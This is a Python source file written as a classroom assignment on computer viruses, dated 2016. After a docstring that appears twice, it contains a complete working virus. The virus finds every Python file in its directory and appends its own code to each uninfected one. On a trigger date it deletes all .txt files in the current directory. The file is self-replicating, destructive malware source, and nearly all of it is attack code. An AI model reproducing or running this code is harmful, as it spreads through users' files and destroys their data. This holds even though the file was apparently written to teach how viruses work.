'''
Author: Scott Heggen
Date: 10/26/2016
Assignment: T13: Viruses

This file is the start to your virus. The virus should do three things:
1) Search for all Python files in the same directory as this file.
2) Infect those files by copying all of this code to those files.
3) do something destructive or malicious under some trigger condition.

Remember, you're building a computer virus.
Try not to destroy yourself in the process.
'''
'''
Author: Scott Heggen
Date: 10/26/2016
Assignment: T13: Viruses

This file is the start to your virus. The virus should do three things:
1) Search for all Python files in the same directory as this file.
2) Infect those files by copying all of this code to those files.
3) do something destructive or malicious under some trigger condition.

Remember, you're building a computer virus.
Try not to destroy yourself in the process.
'''

import os
from datetime import date as dt

# Your calling sign!
SIGNATURE = "SHEGGEN PLAY"

def findPythonFiles(path):
    # Search for any PY files in the currently directory.
    # Returns a list of all the files to infect.
    filestoinfect = []

    for file in os.listdir(path):
        if file.endswith(".py"):
            filestoinfect.append(file)
    return filestoinfect


def infectPythonFiles(filestoinfect):
    # Dump all this code into the Python files found in the search() function
    f = open(__file__, "r")
    code = f.readlines()
    for file in filestoinfect:
        f = open(file, "r")
        CHECK_SIGNATURE = 'SIGNATURE = "{}"\n'.format(SIGNATURE)
        if CHECK_SIGNATURE in f.readlines():
            #print "{0} file has signature".format(file)
            pass
        else:
            f = open(file, "a")
            for line in code:
                f.write(line)

def destroyTheWorld():
    # Your destructive code. Delete all TXT files in the current directory.
    if dt.today() == dt(2016, 10, 27):
        for file in os.listdir("."):
            if file.endswith(".txt"):
                os.remove(file)

def main():
    files2infect = findPythonFiles(".")
    infectPythonFiles(files2infect)
    destroyTheWorld()

if __name__ == "__main__":
    main()
